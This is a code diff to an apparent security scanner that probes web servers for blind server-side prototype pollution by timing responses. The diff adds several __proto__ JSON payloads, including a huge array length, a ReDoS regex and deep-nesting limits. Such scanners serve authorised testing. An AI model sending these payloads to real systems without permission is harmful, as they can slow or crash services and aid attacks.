@@ -260,28 +260,34 @@ class Tier1BlindScanner(BaseTierScanner):
             
             avg_baseline = sum(baseline_times) / len(baseline_times)
             
-            # Payload designed to force internal iteration or regex delay
-            pollution_payload = {
-                "__proto__": {
-                    "length": 1000000, 
-                    "test_timing": "A" * 10000
-                }
-            }
-            start = time.time()
-            resp = session.post(target_url, json=pollution_payload, timeout=10, verify=False)
-            polluted_time = time.time() - start
+            # Payload designed to force internal iteration, regex delay, or deep nesting
+            timing_payloads = [
+                # Array length overflow (can cause out-of-memory or huge loop delays)
+                {"__proto__": {"length": 10000000, "test_timing": "A" * 10000}},
+                # Regex options pollution aiming for ReDoS amplification if vulnerable regex is present
+                {"__proto__": {"pattern": "(a+)+$", "flags": "g"}},
+                # Deep nested object creation delay
+                {"__proto__": {"limit": 1000000, "maxDepth": 5000}}
+            ]
+            
+            for pollution_payload in timing_payloads:
+                start = time.time()
+                resp = session.post(target_url, json=pollution_payload, timeout=12, verify=False)
+                polluted_time = time.time() - start
+    
+                # Analysis: if polluted time is significantly higher (margin of 1.5s or 3x slower)
+                if polluted_time > (avg_baseline * 3) and (polluted_time - avg_baseline) > 1.5:
+                    findings.append({
+                        "type": "blind_pp_detected",
+                        "method": "TIMING_ANALYSIS_FALLBACK",
+                        "severity": "MEDIUM",
+                        "description": "Server-side PP detected via Timing Analysis side-channel (Interact.sh Fallback/ReDoS)",
+                        "payload": pollution_payload,
+                        "indicator": f"Response delayed: ~{polluted_time:.2f}s (baseline: {avg_baseline:.2f}s)",
+                    })
+                    print(f"{Colors.WARNING}[!] MEDIUM: Blind PP via Timing Analysis ({polluted_time:.2f}s delay)!{Colors.ENDC}")
+                    break # Stop if we found a successful timing bypass
 
-            # Analysis: if polluted time is significantly higher (margin of 1s or 3x slower)
-            if polluted_time > (avg_baseline * 3) and (polluted_time - avg_baseline) > 1.0:
-                findings.append({
-                    "type": "blind_pp_detected",
-                    "method": "TIMING_ANALYSIS",
-                    "severity": "MEDIUM",
-                    "description": "Server-side PP detected via Timing Analysis side-channel",
-                    "payload": pollution_payload,
-                    "indicator": f"Response delayed: ~{polluted_time:.2f}s (baseline: {avg_baseline:.2f}s)",
-                })
-                print(f"{Colors.WARNING}[!] MEDIUM: Blind PP via Timing Analysis ({polluted_time:.2f}s delay)!{Colors.ENDC}")
         except Exception as e:
             logger.debug(f"Timing analysis test error: {e}")
 
